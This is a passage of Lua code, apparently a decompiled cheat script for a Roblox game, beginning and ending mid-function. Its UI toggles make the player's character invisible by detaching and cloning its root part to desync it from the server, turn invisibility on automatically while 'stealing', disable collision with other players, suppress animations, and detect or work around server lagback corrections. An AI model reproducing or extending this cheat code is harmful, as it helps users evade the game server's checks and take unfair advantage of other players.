				end
			end,
		})
	end

	do
		local flag2 = false
		local n2 = 0
		local connection = nil
		local connection2 = nil
		local connection3 = nil
		local v12 = nil
		local tbl4 = {}

		local function fn16(arg)
			local character_ = localPlayer.Character
			character_ = character_ and character_:FindFirstChildWhichIsA("Tool")
			if not character_ or not character_:IsA("Tool") then
				return false
			end
			local animation = arg.Animation
			local v13 = string.lower(tostring(arg.Name or ""))
			local v14 = string.lower(tostring(animation and animation.Name or ""))
			local priority = arg.Priority
			local flag3 = priority == Enum.AnimationPriority.Action or priority == Enum.AnimationPriority.Action2 or priority == Enum.AnimationPriority.Action3 or priority == Enum.AnimationPriority.Action4
			local flag4 = string.find(v13, "tool", 1, true) ~= nil or string.find(v13, "paint", 1, true) ~= nil or string.find(v13, "gun", 1, true) ~= nil or string.find(v14, "tool", 1, true) ~= nil or string.find(v14, "paint", 1, true) ~= nil or string.find(v14, "gun", 1, true) ~= nil
			return flag4 or flag3, flag4
		end

		local function fn17()
			if connection3 then
				connection3:Disconnect()
				connection3 = nil
			end
		end

		local function fn18()
			if connection then
				connection:Disconnect()
				connection = nil
			end

			if connection2 then
				connection2:Disconnect()
				connection2 = nil
			end
		end

		local function fn19(arg, arg2)
			local v13 = tbl4[arg]
			if not v13 then
				return
			end
			tbl4[arg] = nil

			if v13.WeightConnection then
				v13.WeightConnection:Disconnect()
			end

			if v13.StoppedConnection then
				v13.StoppedConnection:Disconnect()
			end

			if arg2 then
				pcall(function()
					if arg.IsPlaying then
						arg:AdjustWeight(v13.DesiredWeight, 0.1)
					end
				end)
			end
		end

		local function fn20(arg)
			local tbl5 = {}

			for k in pairs(tbl4) do
				tbl5[#tbl5 + 1] = k
			end

			for _, v13 in ipairs(tbl5) do
				fn19(v13, arg)
			end
		end

		local function fn21(arg)
			if not flag2 then
				return
			end
			local v13, v14 = fn16(arg)

			if v13 then
				if tbl4[arg] then
					fn19(arg, true)
				elseif v14 then
					pcall(function()
						if arg.IsPlaying and arg.WeightTarget <= 0 and arg.WeightCurrent <= 0.01 then
							arg:AdjustWeight(1, 0.05)
						end
					end)
				end

				return
			end

			if tbl4[arg] then
				return
			end
			local n3 = 1

			pcall(function()
				if arg.WeightTarget > 0 then
					n3 = arg.WeightTarget
				elseif arg.WeightCurrent > 0 then
					n3 = arg.WeightCurrent
				end
			end)

			local tbl5 = { Applying = false, DesiredWeight = n3 }
			tbl4[arg] = tbl5

			tbl5.WeightConnection = arg:GetPropertyChangedSignal("WeightTarget"):Connect(function()
				if not flag2 or tbl5.Applying then
					return
				end

				if fn16(arg) then
					fn19(arg, true)
					return
				end

				pcall(function()
					local weightTarget = arg.WeightTarget

					if weightTarget > 0 then
						tbl5.DesiredWeight = weightTarget
					end

					tbl5.Applying = true
					arg:AdjustWeight(0, 0)
				end)

				tbl5.Applying = false
			end)

			tbl5.StoppedConnection = arg.Stopped:Connect(function()
				fn19(arg, false)
			end)

			tbl5.Applying = true

			pcall(function()
				arg:AdjustWeight(0, 0)
			end)

			tbl5.Applying = false
		end

		local function fn22(arg)
			if not flag2 or arg ~= v12 then
				return
			end

			for _, v13 in ipairs(arg:GetPlayingAnimationTracks()) do
				fn21(v13)
			end
		end

		local function fn23(arg)
			fn17()
			fn18()
			fn20(arg)
			v12 = nil
		end

		local function fn24(arg)
			n2 += 1
			local v13 = n2

			task.spawn(function()
				local humanoid = arg:FindFirstChildOfClass("Humanoid") or arg:WaitForChild("Humanoid", 5)
				if not flag2 or n2 ~= v13 or arg ~= localPlayer.Character or not humanoid then
					return
				end
				local animator = humanoid:FindFirstChildOfClass("Animator") or humanoid:WaitForChild("Animator", 5)
				if not flag2 or n2 ~= v13 or arg ~= localPlayer.Character or not animator then
					return
				end
				fn23(false)
				v12 = animator
				fn22(animator)

				connection3 = animator.AnimationPlayed:Connect(function(arg2)
					if flag2 and v12 == animator then
						fn21(arg2)
					end
				end)

				local function fn25(child)
					if not child:IsA("Tool") then
						return
					end

					task.defer(function()
						if flag2 and n2 == v13 and arg == localPlayer.Character and v12 == animator then
							fn22(animator)
						end
					end)
				end

				connection = arg.ChildAdded:Connect(fn25)
				connection2 = arg.ChildRemoved:Connect(fn25)
			end)
		end

		local connection4 = localPlayer.CharacterAdded:Connect(function(character_)
			if flag2 then
				fn24(character_)
			end
		end)

		fn2(function()
			flag2 = false
			n2 += 1
			fn23(true)

			if connection4 then
				connection4:Disconnect()
				connection4 = nil
			end
		end)

		v6:CreateToggle({
			Name = "No Animation",
			Default = true,
			Callback = function(arg)
				flag2 = arg == true

				if flag2 then
					local character_ = localPlayer.Character

					if character_ then
						fn24(character_)
					end
				else
					n2 += 1
					fn23(true)
				end
			end,
		})
	end

	do
		local flag2 = false
		local n2 = 0
		local connection = nil
		local connection2 = nil
		local connection3 = nil
		local connection4 = nil
		local tbl4 = {}
		local tbl5 = {}
		local obj2 = setmetatable({}, { __mode = "k" })

		local function fn16(arg)
			local flag3 = arg and arg:GetAttribute("Web") == true
			local flag4

			if flag3 then
				local name = localPlayer.Name
				flag4 = arg:GetAttribute("WebTo") == name
			else
				flag4 = flag3
			end

			return flag4
		end

		local function fn17(arg, arg2)
			if not flag2 or not arg.Parent or arg2.Applying then
				return
			end
			local canCollide = false

			if fn16(arg2.OwnerPlayer) then
				canCollide = arg2.OriginalCanCollide
			end

			if arg.CanCollide ~= canCollide then
				arg2.Applying = true

				pcall(function()
					arg.CanCollide = canCollide
				end)

				arg2.Applying = false
			end
		end

		local function fn18(arg, arg2)
			local v12 = obj2[arg]
			if not v12 then
				return
			end
			obj2[arg] = nil

			if v12.CollisionConnection then
				v12.CollisionConnection:Disconnect()
			end

			if v12.DestroyingConnection then
				v12.DestroyingConnection:Disconnect()
			end

			if arg2 and arg.Parent then
				pcall(function()
					v12.Applying = true
					arg.CanCollide = v12.OriginalCanCollide
					v12.Applying = false
				end)
			end
		end

		local function fn19(arg, ownerPlayer)
			if not flag2 then
				return
			end
			local v12 = obj2[arg]

			if v12 then
				v12.OwnerPlayer = ownerPlayer
				fn17(arg, v12)
				return
			end

			local tbl6 = { Applying = false, OwnerPlayer = ownerPlayer, OriginalCanCollide = arg.CanCollide }
			obj2[arg] = tbl6

			tbl6.CollisionConnection = arg:GetPropertyChangedSignal("CanCollide"):Connect(function()
				if flag2 and not tbl6.Applying and arg.Parent then
					fn17(arg, tbl6)
				end
			end)

			tbl6.DestroyingConnection = arg.Destroying:Connect(function()
				fn18(arg, false)
			end)

			fn17(arg, tbl6)
		end

		local function fn20(arg, ownerPlayer)
			if not flag2 then
				return
			end
			local v12 = obj2[arg]

			if not v12 then
				fn19(arg, ownerPlayer)
			else
				v12.OwnerPlayer = ownerPlayer
				fn17(arg, v12)
			end
		end

		local function fn21(arg, arg2)
			if arg.DescendantAddedConnection then
				arg.DescendantAddedConnection:Disconnect()
				arg.DescendantAddedConnection = nil
			end

			if arg.DescendantRemovingConnection then
				arg.DescendantRemovingConnection:Disconnect()
				arg.DescendantRemovingConnection = nil
			end

			local character_ = arg.Character
			arg.Character = nil
			if not character_ then
				return
			end
			local tbl6 = {}

			for k in pairs(obj2) do
				if k:IsDescendantOf(character_) then
					tbl6[#tbl6 + 1] = k
				end
			end

			for _, v12 in ipairs(tbl6) do
				fn18(v12, arg2)
			end
		end

		local function fn22(arg, character_)
			local v12 = tbl4[arg]
			if not flag2 or not v12 or arg == localPlayer then
				return
			end
			fn21(v12, false)
			v12.Character = character_

			for _, descendant in ipairs(character_:GetDescendants()) do
				if descendant:IsA("BasePart") then
					fn20(descendant, arg)
				end
			end

			v12.DescendantAddedConnection = character_.DescendantAdded:Connect(function(descendant)
				if flag2 and descendant:IsA("BasePart") then
					fn20(descendant, arg)
				end
			end)

			v12.DescendantRemovingConnection = character_.DescendantRemoving:Connect(function(descendant)
				if descendant:IsA("BasePart") then
					fn18(descendant, false)
				end
			end)
		end

		local function fn23(arg)
			if not arg:IsA("Model") then
				return false
			end
			return string.sub(string.lower(arg.Name), -6) == "_clone"
		end

		local function fn24(arg, arg2)
			local v12 = tbl5[arg]
			if not v12 then
				return
			end
			tbl5[arg] = nil

			if v12.DestroyingConnection then
				v12.DestroyingConnection:Disconnect()
				v12.DestroyingConnection = nil
			end

			fn21(v12, arg2)
		end

		local function fn25(arg)
			if not flag2 or tbl5[arg] or not fn23(arg) then
				return
			end
			local tbl6 = { Character = arg }
			tbl5[arg] = tbl6

			for _, descendant in ipairs(arg:GetDescendants()) do
				if descendant:IsA("BasePart") then
					fn20(descendant, nil)
				end
			end

			tbl6.DescendantAddedConnection = arg.DescendantAdded:Connect(function(descendant)
				if flag2 and descendant:IsA("BasePart") then
					fn20(descendant, nil)
				end
			end)

			tbl6.DescendantRemovingConnection = arg.DescendantRemoving:Connect(function(descendant)
				if descendant:IsA("BasePart") then
					fn18(descendant, false)
				end
			end)

			tbl6.DestroyingConnection = arg.Destroying:Connect(function()
				fn24(arg, false)
			end)
		end

		local function fn26()
			for _, child in ipairs(Workspace:GetChildren()) do
				if fn23(child) then
					fn25(child)

					for _, descendant in ipairs(child:GetDescendants()) do
						if descendant:IsA("BasePart") then
							fn20(descendant, nil)
						end
					end
				end
			end

			local tbl6 = {}

			for k in pairs(tbl5) do
				if not k:IsDescendantOf(Workspace) then
					tbl6[#tbl6 + 1] = k
				end
			end

			for _, v12 in ipairs(tbl6) do
				fn24(v12, false)
			end
		end

		local function fn27(arg)
			for k, v12 in pairs(obj2) do
				if v12.OwnerPlayer == arg then
					fn17(k, v12)
				end
			end
		end

		local function fn28(arg, arg2)
			local v12 = tbl4[arg]
			if not v12 then
				return
			end
			tbl4[arg] = nil
			fn21(v12, arg2)

			if v12.CharacterAddedConnection then
				v12.CharacterAddedConnection:Disconnect()
			end

			if v12.CharacterRemovingConnection then
				v12.CharacterRemovingConnection:Disconnect()
			end

			if v12.WebConnection then
				v12.WebConnection:Disconnect()
			end

			if v12.WebTargetConnection then
				v12.WebTargetConnection:Disconnect()
			end
		end

		local function fn29(arg)
			if arg == localPlayer or tbl4[arg] then
				return
			end
			local tbl6 = {}
			tbl4[arg] = tbl6

			tbl6.WebConnection = arg:GetAttributeChangedSignal("Web"):Connect(function()
				if flag2 then
					fn27(arg)
				end
			end)

			tbl6.WebTargetConnection = arg:GetAttributeChangedSignal("WebTo"):Connect(function()
				if flag2 then
					fn27(arg)
				end
			end)

			tbl6.CharacterAddedConnection = arg.CharacterAdded:Connect(function(character_)
				if flag2 then
					fn22(arg, character_)
				end
			end)

			tbl6.CharacterRemovingConnection = arg.CharacterRemoving:Connect(function(character_)
				if tbl6.Character == character_ then
					fn21(tbl6, false)
				end
			end)

			if arg.Character then
				fn22(arg, arg.Character)
			end
		end

		local function fn30()
			flag2 = false
			n2 += 1

			if connection then
				connection:Disconnect()
				connection = nil
			end

			if connection2 then
				connection2:Disconnect()
				connection2 = nil
			end

			if connection3 then
				connection3:Disconnect()
				connection3 = nil
			end

			if connection4 then
				connection4:Disconnect()
				connection4 = nil
			end

			local tbl6 = {}

			for k in pairs(tbl4) do
				tbl6[#tbl6 + 1] = k
			end

			for _, v12 in ipairs(tbl6) do
				fn28(v12, true)
			end

			local tbl7 = {}

			for k in pairs(tbl5) do
				tbl7[#tbl7 + 1] = k
			end

			for _, v12 in ipairs(tbl7) do
				fn24(v12, true)
			end

			local tbl8 = {}

			for k in pairs(obj2) do
				tbl8[#tbl8 + 1] = k
			end

			for _, v12 in ipairs(tbl8) do
				fn18(v12, true)
			end
		end

		local function fn31()
			n2 += 1
			local v12 = n2

			task.spawn(function()
				while flag2 and n2 == v12 do
					for _, player in ipairs(Players:GetPlayers()) do
						if player ~= localPlayer then
							pcall(function()
								fn29(player)
								local v13 = tbl4[player]
								local character_ = player.Character

								if v13 and character_ then
									if v13.Character ~= character_ then
										fn22(player, character_)
									else
										for _, descendant in ipairs(character_:GetDescendants()) do
											if descendant:IsA("BasePart") then
												fn20(descendant, player)
											end
										end
									end
								end
							end)
						end
					end

					fn26()
					task.wait(1)
				end
			end)
		end

		local function fn32()
			if flag2 then
				return
			end
			flag2 = true

			connection = Players.PlayerAdded:Connect(function(player)
				fn29(player)

				task.defer(function()
					local v12 = tbl4[player]
					local character_ = player.Character

					if flag2 and v12 and character_ and v12.Character ~= character_ then
						fn22(player, character_)
					end
				end)
			end)

			connection2 = Players.PlayerRemoving:Connect(function(player)
				fn28(player, false)
			end)

			connection3 = Workspace.ChildAdded:Connect(function(child)
				if flag2 and fn23(child) then
					fn25(child)
				end
			end)

			connection4 = Workspace.ChildRemoved:Connect(function(child)
				if tbl5[child] then
					fn24(child, false)
				end
			end)

			for _, player in ipairs(Players:GetPlayers()) do
				fn29(player)
			end

			fn26()
			fn31()
		end

		fn2(fn30)

		v6:CreateToggle({
			Name = "Disable Player Collision",
			Note = "Lets you move through other players and player clones without being blocked.",
			Default = true,
			Callback = function(arg)
				if arg then
					fn32()
				else
					fn30()
				end
			end,
		})
	end

	local animationId
	animationId = "rbxassetid://18537363391"
	local n2
	n2 = 5
	local n3
	n3 = 1.5
	local n4
	n4 = 0.04
	local flag2, flag3, flag4, flag5, flag6, flag7, n5, n6, clone, humanoidRootPart
	local v12, n7

	do
		local n8 = 0.01
		flag2 = false
		flag3 = false
		flag4 = false
		flag5 = true
		flag6 = false
		flag7 = false
		n5 = 0.09
		n6 = 225
		clone = nil
		humanoidRootPart = nil
		v12 = nil
		local hipHeight = nil
		local v13 = nil
		local n9 = 0
		n7 = 0
		local n10 = 0
		local tbl4 = {}
		local v14 = nil
		local n11 = 0
		local v15 = nil
		local n12 = 0
		local n13 = 0
		local v16 = nil
		local n14 = 0
		local createSlider = nil

		local function fn16(arg)
			if arg and arg.Connected then
				arg:Disconnect()
			end
		end

		local function fn17()
			for _, v17 in ipairs(tbl4) do
				fn16(v17)
			end

			table.clear(tbl4)
		end

		local function fn18(arg)
			tbl4[#tbl4 + 1] = arg
			return arg
		end

		local function fn19(arg)
			if not arg or tbl2.ProtectedHumanoid ~= arg or arg.Health <= 0 then
				return false
			end

			local ok, result = pcall(function()
				return arg.BreakJointsOnDeath == false and arg.RequiresNeck == false and arg:GetStateEnabled(Enum.HumanoidStateType.Dead) == false
			end)

			return ok and result == true
		end

		local function fn20(arg, arg2)
			for _, descendant in ipairs(arg:GetDescendants()) do
				if descendant:IsA("Weld") or descendant:IsA("WeldConstraint") then
					local part0 = descendant.Part0
					local part1 = descendant.Part1

					if not (part0 and not part0:IsDescendantOf(arg)) then
						local flag8 = part1 and not part1:IsDescendantOf(arg)
						local v17 = nil
						local v18 = nil

						if flag8 then
							local v19 = part0
							part0 = part1
							part1 = v19
						else
							part0 = v17
							part1 = v18
						end
					end

					if part0 and part0:IsA("BasePart") and part1 and part1:IsA("BasePart") and part1:IsDescendantOf(arg) and (part0.Position - arg2.Position).Magnitude <= 5 then
						return part0, part1
					end
				end
			end

			return nil
		end

		local function fn21(arg)
			if localPlayer:GetAttribute("Stealing") ~= true then
				return nil
			end
			local character_ = localPlayer.Character
			local tbl5 = { arg }

			if humanoidRootPart and humanoidRootPart.Parent and humanoidRootPart ~= arg then
				tbl5[#tbl5 + 1] = humanoidRootPart
			end

			local huge = math.huge
			local v17 = nil

			for _, child in ipairs(Workspace:GetChildren()) do
				if child:IsA("Model") and child ~= character_ and not Players:GetPlayerFromCharacter(child) and child.Name:sub(-6) ~= "_Clone" then
					local rootPart = child:FindFirstChild("RootPart") or child.PrimaryPart or child:FindFirstChildWhichIsA("BasePart")

					if rootPart and rootPart:IsA("BasePart") then
						for i_, v18 in ipairs(tbl5) do
							local v19, v20 = fn20(child, v18)

							if v19 and v20 then
								local v21 = v18.CFrame:PointToObjectSpace(v19.Position)
								local magnitude = (v20.Position - v18.Position).Magnitude

								if math.abs(v21.X) <= 5 and v21.Y >= -3 and v21.Y <= 7 and v21.Z >= -7 and v21.Z <= 4 and magnitude <= 14 then
									local n15 = (v19.Position - v18.Position).Magnitude + magnitude * 0.05 + (i_ - 1) * 0.01

									if n15 < huge then
										huge = n15
										v17 = child
									end
								end
							end
						end
					end
				end
			end

			return v17
		end

		local function fn22()
			if localPlayer:GetAttribute("Stealing") == true and v15 and v15.Parent then
				return v15
			end
			return nil
		end

		local function fn23()
			n12 += 1
			local v17 = n12
			v15 = nil
			v16 = nil
			if not flag or not flag3 or not flag7 or localPlayer:GetAttribute("Stealing") ~= true then
				return
			end

			task.spawn(function()
				while flag and v17 == n12 and flag3 and flag7 and localPlayer:GetAttribute("Stealing") == true do
					local character_ = localPlayer.Character
					character_ = character_ and character_:FindFirstChild("HumanoidRootPart")

					if character_ then
						local v18 = fn21(character_)
						if v18 then
							v15 = v18
							return
						end
					end

					task.wait(0.15)
				end
			end)
		end

		local function fn24(arg, arg2)
			local raycastParams = RaycastParams.new()
			raycastParams.FilterType = Enum.RaycastFilterType.Exclude
			raycastParams.IgnoreWater = true
			raycastParams.FilterDescendantsInstances = { localPlayer.Character, arg2, humanoidRootPart }
			local hit = Workspace:Raycast(arg.Position + Vector3.new(0, 8, 0), Vector3.new(0, -50, 0), raycastParams)
			return hit and hit.Position.Y or nil
		end

		local function fn25(arg, arg2)
			return math.abs((arg - arg2 + 180) % 360 - 180)
		end

		local function fn26(arg, arg2)
			local v17 = fn22()
			if not v17 or not humanoidRootPart or not humanoidRootPart.Parent then
				v16 = nil
				return
			end
			local v18 = fn24(arg, v17)
			if not v18 then
				return
			end

			local ok, result, result2 = pcall(function()
				local boundingBox, v19 = v17:GetBoundingBox()
				return boundingBox, v19
			end)

			if not ok or not result or not result2 then
				return
			end
			local tbl5 = {}

			for i_ = -1, 1, 2 do
				for i_2 = -1, 1, 2 do
					for i_3 = -1, 1, 2 do
						local n15 = #tbl5 + 1
						local cFrame = humanoidRootPart.CFrame
						local pointToObjectSpace = cFrame.PointToObjectSpace
						local v19 = result:PointToWorldSpace(Vector3.new(result2.X * 0.5 * i_, result2.Y * 0.5 * i_2, result2.Z * 0.5 * i_3))
						tbl5[n15] = pointToObjectSpace(cFrame, v19)
					end
				end
			end

			local n15 = arg.CFrame - Vector3.new(0, arg2.HipHeight + arg.Size.Y * 0.5 - 1 + n5, 0)
			local n16 = n6 % 360
			local huge = math.huge
			local v19 = n16

			for i_ = 0, 13 do
				local n17 = 217 + i_
				local n18 = n15 * CFrame.Angles(math.rad(n17), 0, 0)
				local tbl6 = {}
				local n19 = -math.huge

				for _, v20 in ipairs(tbl5) do
					local y = n18:PointToWorldSpace(v20).Y
					tbl6[#tbl6 + 1] = y

					if n19 < y then
						n19 = y
					end
				end

				local n20 = n19 - v18
				local v20, v21, v22 = ipairs(tbl6)
				local n21 = 0
				local n22 = 0
				local n23 = 0

				for _, v23 in v20, v21, v22 do
					local n24 = v23 - v18

					if n8 < n24 then
						n21 += 1
						n22 += n24
					end

					if n19 - v23 <= 0.035 then
						n23 += 1
					end
				end

				local n24

				if n21 == 0 then
					n24 = n20 * 100 + fn25(n17, n16) * 0.001
				else
					n24 = n21 * 1000 + n23 * 100 + math.max(n20, 0) * 50 + n22 * 10 + fn25(n17, n16) * 0.001
				end

				if n24 < huge then
					huge = n24
					v19 = n17
				end
			end

			v16 = v19
		end

		local function fn27(arg, arg2, arg3)
			return (arg + ((arg2 - arg + 180) % 360 - 180) * arg3) % 360
		end

		local function fn28()
			local v17 = Workspace:FindFirstChild(localPlayer.Name)
			if not v17 then
				return
			end
			local doubleRig = v17:FindFirstChild("DoubleRig")

			if doubleRig then
				doubleRig:Destroy()
			end

			local constraints = v17:FindFirstChild("Constraints")

			if constraints then
				constraints:Destroy()
			end

			fn18(v17.ChildAdded:Connect(function(child)
				if child.Name == "DoubleRig" or child.Name == "Constraints" then
					task.defer(function()
						if flag3 and child.Parent then
							child:Destroy()
						end
					end)
				end
			end))
		end

		local function fn29()
			local character_ = localPlayer.Character
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			if not character_ or not humanoid or not fn19(humanoid) then
				return false
			end
			hipHeight = humanoid.HipHeight
			humanoidRootPart = character_:FindFirstChild("HumanoidRootPart")
			if not humanoidRootPart or not humanoidRootPart.Parent then
				return false
			end
			v12 = character_
			local model = Instance.new("Model")
			model.Parent = game
			character_.Parent = model
			clone = humanoidRootPart:Clone()
			clone.Parent = character_
			humanoidRootPart.Parent = Workspace.CurrentCamera
			clone.CFrame = humanoidRootPart.CFrame
			character_.PrimaryPart = clone
			character_.Parent = Workspace

			for _, descendant in ipairs(character_:GetDescendants()) do
				if descendant:IsA("Weld") or descendant:IsA("Motor6D") then
					if descendant.Part0 == humanoidRootPart then
						descendant.Part0 = clone
					end

					if descendant.Part1 == humanoidRootPart then
						descendant.Part1 = clone
					end
				end
			end

			model:Destroy()
			return true
		end

		local function fn30()
			local v17 = v12
			if not humanoidRootPart or not humanoidRootPart:IsDescendantOf(game) or not v17 then
				return false
			end

			if v17 ~= localPlayer.Character or v17.Parent ~= Workspace then
				if clone and clone.Parent then
					pcall(function()
						clone:Destroy()
					end)
				end

				if humanoidRootPart and humanoidRootPart.Parent then
					pcall(function()
						humanoidRootPart:Destroy()
					end)
				end

				return false
			end

			local ok = pcall(function()
				local model = Instance.new("Model")
				model.Parent = game
				v17.Parent = model
				humanoidRootPart.Parent = v17
				v17.PrimaryPart = humanoidRootPart
				v17.Parent = Workspace
				humanoidRootPart.CanCollide = true

				for _, descendant in ipairs(v17:GetDescendants()) do
					if descendant:IsA("Weld") or descendant:IsA("Motor6D") then
						if descendant.Part0 == clone then
							descendant.Part0 = humanoidRootPart
						end

						if descendant.Part1 == clone then
							descendant.Part1 = humanoidRootPart
						end
					end
				end

				if clone then
					local cFrame = clone.CFrame
					clone:Destroy()
					clone = nil
					humanoidRootPart.CFrame = cFrame
				end

				local humanoid = v17:FindFirstChildOfClass("Humanoid")

				if humanoid and hipHeight ~= nil then
					humanoid.HipHeight = hipHeight
				end

				model:Destroy()
			end)

			if not ok and humanoidRootPart and humanoidRootPart.Parent then
				pcall(function()
					humanoidRootPart:Destroy()
				end)
			end

			return ok
		end

		local fn31 = nil

		fn31 = function()
			if not flag3 then
				return
			end
			local character_ = localPlayer.Character
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			if not character_ or not humanoid or humanoid.Health <= 0 then
				return
			end
			local animation = Instance.new("Animation")
			animation.AnimationId = animationId
			local v17 = (humanoid:FindFirstChildOfClass("Animator") or Instance.new("Animator", humanoid)):LoadAnimation(animation)
			animation:Destroy()
			v13 = v17
			v17.Priority = Enum.AnimationPriority.Action4
			v17:Play(0, 1, 0)

			fn18(v17.Stopped:Connect(function()
				if flag3 and v13 == v17 then
					fn31()
				end
			end))

			task.defer(function()
				if flag3 and v13 == v17 then
					pcall(function()
						v17.TimePosition = 0.7
					end)

					task.delay(1, function()
						if flag3 and v13 == v17 then
							pcall(function()
								v17:AdjustSpeed(math.huge)
							end)
						end
					end)
				end
			end)
		end

		local flag8 = false

		local function fn32(arg)
			if arg ~= false then
				n7 += 1
				flag8 = false
			end

			n9 += 1
			n10 += 1
			flag3 = false
			n12 += 1
			v15 = nil
			v16 = nil
			n13 = 0
			v14 = nil

			if v13 then
				pcall(function()
					v13:Stop()
				end)

				pcall(function()
					v13:Destroy()
				end)

				v13 = nil
			end

			fn17()
			fn30()
			clone = nil
			humanoidRootPart = nil
			v12 = nil
			hipHeight = nil
		end

		local fn33 = nil

		local function fn34()
			if flag8 then
				return
			end
			flag8 = true
			n7 += 1
			local v17 = n7

			task.spawn(function()
				fn32(false)
				local character_ = localPlayer.Character

				if character_ then
					character_ = character_.PrimaryPart or character_:FindFirstChild("HumanoidRootPart")
				end

				character_ = character_ and character_.Position or nil
				local now = os.clock()
				local n15 = 0

				while true do
					if flag and v17 == n7 and flag2 and os.clock() - now < 3.5 then
						local result = RunService.Heartbeat:Wait()

						if not (v17 ~= n7 or not flag2) then
							local character_2 = localPlayer.Character
							local primaryPart = character_2 and (character_2.PrimaryPart or character_2:FindFirstChild("HumanoidRootPart"))
							character_2 = character_2 and character_2:FindFirstChildOfClass("Humanoid")

							if primaryPart and character_2 and character_2.Health > 0 then
								local position = primaryPart.Position

								if character_ then
									if (position - character_).Magnitude > 4 then
										n15 = 0
										character_ = position
										continue
									else
										n15 += result
										local n16 = os.clock() - now
										if not (n15 >= 0.6 and n16 >= 0.7) then
											character_ = position
											continue
										end
									end
								else
									character_ = position
									continue
								end
							else
								n15 = 0
								continue
							end
						end
					end

					break
				end

				flag8 = false

				if v17 == n7 and flag and flag2 then
					if fn33 then
						fn33()
					end
				end
			end)
		end

		fn33 = function()
			if flag3 then
				return true
			end

			if humanoidRootPart or clone or v12 then
				fn32()
			end

			local character_ = localPlayer.Character
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")
			local humanoidRootPart2 = character_ and character_:FindFirstChild("HumanoidRootPart")
			if not character_ or character_.Parent ~= Workspace or not humanoid or humanoid.Health <= 0 or not humanoidRootPart2 or humanoidRootPart2.Parent ~= character_ or character_.PrimaryPart ~= humanoidRootPart2 then
				return false
			end
			n9 += 1
			local v17 = n9
			fn17()
			fn28()
			if not fn29() then
				fn17()
				return false
			end
			flag3 = true
			task.wait(0.1)
			if v17 ~= n9 or not flag3 then
				return false
			end
			fn31()
			fn23()

			fn18(RunService.PreSimulation:Connect(function()
				local character_2 = localPlayer.Character
				local humanoid2 = character_2 and character_2:FindFirstChildOfClass("Humanoid")
				character_2 = character_2 and character_2.PrimaryPart
				if not flag3 or not humanoid2 or humanoid2.Health <= 0 or not humanoidRootPart or not humanoidRootPart.Parent or not character_2 then
					return
				end

				if flag7 and localPlayer:GetAttribute("Stealing") == true then
					local now = os.clock()

					if n4 <= now - n13 then
						n13 = now
						fn26(character_2, humanoid2)
					end

					if v16 ~= nil then
						n6 = fn27(n6, v16, 0.42)
					end

					if createSlider and now >= n14 then
						n14 = now + 0.1
						createSlider:Set(math.floor(n6 + 0.5), false)
					end
				else
					v15 = nil
					v16 = nil
				end

				local cframe = CFrame.Angles
				humanoidRootPart.CFrame = (character_2.CFrame - Vector3.new(0, humanoid2.HipHeight + character_2.Size.Y * 0.5 - 1 + n5, 0)) * cframe(math.rad(n6), 0, 0)
				humanoidRootPart.Velocity = character_2.Velocity
				humanoidRootPart.CanCollide = false
			end))

			v14 = nil

			fn18(RunService.PreAnimation:Connect(function()
				if not flag3 or not humanoidRootPart or not humanoidRootPart.Parent then
					v14 = nil
					return
				end
				local position = humanoidRootPart.Position

				if v14 then
					local magnitude = (position - v14).Magnitude
					local now = os.clock()

					if magnitude > n2 and now - n11 > n3 then
						n11 = now

						if flag5 then
							v.Notify("Lagback detected", "Invisible position was corrected by the server.", 5)
						end

						if flag6 then
							fn34()
						end
					end
				end

				v14 = position
			end))

			return true
		end

		local function fn35(arg, arg2)
			n10 += 1
			local v17 = n10

			task.spawn(function()
				if arg2 and arg2 > 0 then
					task.wait(arg2)
				end

				for i_ = 1, 50 do
					if not flag or v17 ~= n10 or not flag2 or arg ~= localPlayer.Character then
						return
					end
					local humanoid = arg and arg:FindFirstChildOfClass("Humanoid")
					local humanoidRootPart2 = arg and arg:FindFirstChild("HumanoidRootPart")

					if humanoid and fn19(humanoid) and humanoidRootPart2 and humanoidRootPart2.Parent == arg then
						if fn33() then
							return
						end
					end

					task.wait(0.1)
				end
			end)
		end

		local v17 = v7:CreateToggle({
			Name = "Invisible",
			Default = false,
			Keybind = Enum.KeyCode.U,
			Callback = function(arg)
				flag2 = arg == true

				if flag2 then
					fn35(localPlayer.Character, 0.15)
				else
					fn32()
				end
			end,
		})

		local function fn36()
			if not flag4 or not v17 then
				return
			end
			local flag9 = localPlayer:GetAttribute("Stealing") == true
			if v17:Get() ~= flag9 then
				v17:Set(flag9, true)
				return
			end

			if flag9 then
				flag2 = true

				if not flag3 then
					fn35(localPlayer.Character, 0.05)
				end
			elseif flag2 or flag3 or humanoidRootPart ~= nil or clone ~= nil then
				flag2 = false
				fn32()
			end
		end

		v7:CreateToggle({
			Name = "Auto Invisible On Steal",
			Default = false,
			Callback = function(arg)
				flag4 = arg == true

				if flag4 then
					fn36()
				end
			end,
		})

		v7:CreateToggle({
			Name = "Auto Rotation",
			Default = true,
			Callback = function(arg)
				flag7 = arg == true
				n13 = 0
				fn23()
			end,
		})

		createSlider = v7.CreateSlider

		createSlider = createSlider(v7, {
			Name = "Rotation",
			Min = 180,
			Max = 300,
			Default = 279,
			AllowDecimals = false,
			Increment = 1,
			Callback = function(arg)
				n6 = math.clamp(math.floor((tonumber(arg) or 225) + 0.5), 180, 300)
			end,
		})

		v7:CreateSlider({
			Name = "Depth",
			Min = 0,
			Max = 0.7,
			Default = 0.12,
			AllowDecimals = true,
			DecimalPlaces = 2,
			Increment = 0.01,
			Callback = function(arg)
				n5 = math.clamp(tonumber(arg) or 0.09, 0, 0.7)
			end,
		})

		v7:CreateToggle({
			Name = "Lagback Detect",
			Default = true,
			Callback = function(arg)
				flag5 = arg == true
			end,
		})

		v7:CreateToggle({
			Name = "Auto Fix Lagback",
			Default = false,
			Callback = function(arg)
				flag6 = arg == true

				if not flag6 then
					n7 += 1
					flag8 = false
				end
			end,
		})

		tbl.IsActive = function()
			return flag3 == true
		end

		tbl.GetDrop = function()
			local character_ = v12 or localPlayer.Character
			local humanoid = character_ and character_:FindFirstChildOfClass("Humanoid")

			if character_ then
				character_ = character_.PrimaryPart or character_:FindFirstChild("HumanoidRootPart")
			end

			return (humanoid and humanoid.HipHeight and humanoid.HipHeight > 0 and humanoid.HipHeight or 2) + (character_ and character_.Size and character_.Size.Y or 2) * 0.5 - 1 + n5
		end

		tbl.SuspendForReset = function(arg)
			local v18 = v12
			local v19

			if v12 then
				v19 = arg
			else
				v19 = v18
			end

			if v19 and arg ~= v12 then
				return false
			end
